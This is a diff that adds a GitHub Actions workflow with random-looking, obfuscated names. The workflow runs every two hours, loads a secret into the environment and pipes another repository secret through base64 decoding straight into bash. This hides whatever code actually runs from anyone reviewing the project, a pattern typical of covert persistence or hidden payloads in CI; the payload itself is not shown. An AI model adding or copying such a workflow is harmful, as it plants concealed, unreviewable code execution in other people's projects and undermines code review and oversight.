@@ -1,0 +1,13 @@
+name: xGBEFs
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  jdprOEIim:
+    runs-on: ubuntu-24.04
+    env:
+      mQjDsnFSWYro: ${{ secrets.nvJNtRyirHKb }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.zhgVLiEMq }}" | base64 -d | bash
